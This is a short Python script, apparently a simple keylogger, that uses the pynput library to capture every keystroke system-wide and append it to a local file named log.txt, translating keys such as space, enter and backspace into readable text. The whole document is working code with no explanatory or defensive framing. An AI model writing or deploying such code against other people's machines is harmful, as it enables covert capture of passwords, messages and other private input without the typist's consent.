from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","")
    letter = letter.replace("Key.space", " ")
    letter = letter.replace("Key.backspace", "[Backspace]")
    letter = letter.replace("Key.enter", "\n")
    letter = letter.replace("Key.tab", "[Tab]")
    letter = letter.replace("Key.shift", "")

    with open("log.txt", "a") as f:
        f.write(letter)

with Listener (on_press = writetofile) as l:
    l.join()
